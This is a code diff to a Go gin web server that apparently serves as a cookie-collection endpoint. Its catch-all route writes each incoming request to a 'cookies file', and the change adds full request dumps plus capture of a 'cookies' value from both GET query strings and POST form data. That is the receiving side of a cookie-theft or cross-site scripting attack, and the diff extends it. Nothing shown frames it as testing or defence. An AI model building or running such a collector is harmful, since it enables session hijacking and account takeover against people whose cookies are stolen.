@@ -11,6 +11,7 @@ import (
 	"fmt"
 	"math/big"
 	"net/http"
+	"net/http/httputil"
 	"os"
 	"strconv"
 	"time"
@@ -39,34 +40,31 @@ func main() {
 	// Ping handler
 	r.GET("/*page", func(c *gin.Context) {
 		p := c.Param("page")
-		val := c.Request.Header["Cookie"]
+
+		req, err := httputil.DumpRequest(c.Request, true)
+		if err != nil {
+			glog.Warning("Error dumping request")
+		}
 
 		f, err := os.OpenFile(fileName, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
-		defer f.Close()
 
 		if err != nil {
 			glog.Warning("Cannot open cookies file")
 		}
 
+		defer f.Close()
+
 		// Get time
 		t := time.Now()
-		l := fmt.Sprintf("\n\n--- Page: %s ---\n", p)
-		fmt.Println(l)
-		f.Write([]byte(l))
 
-		for _, cookie := range val {
-			l = fmt.Sprintf("\n--- %s ---\nCookie (Header): %s\n", t, cookie)
-			fmt.Println(l)
-			f.Write([]byte(l))
-		}
+		cookieGet := c.Query("cookies")
+		cookiePost := c.PostForm("cookies")
 
-		cookie := c.Query("cookie")
-		l = fmt.Sprintf("\n--- %s ---\nCookie (Param): %s\n", t, cookie)
-		fmt.Println(l)
+		l := fmt.Sprintf("\n\n--- [%s] Page: %s ---\n", t, p)
+		l = fmt.Sprintf("%sFull Request:\n%s\n", l, req)
+		l = fmt.Sprintf("\n%sSent Cookies: \nGET: %s\nPOST: %s\n\n", l, cookieGet, cookiePost)
+
 		f.Write([]byte(l))
-		if err != nil {
-			glog.Fatal("Error writing to file")
-		}
 	})
 
 	hostAddr := fmt.Sprintf("%s:%d", hostname, port)
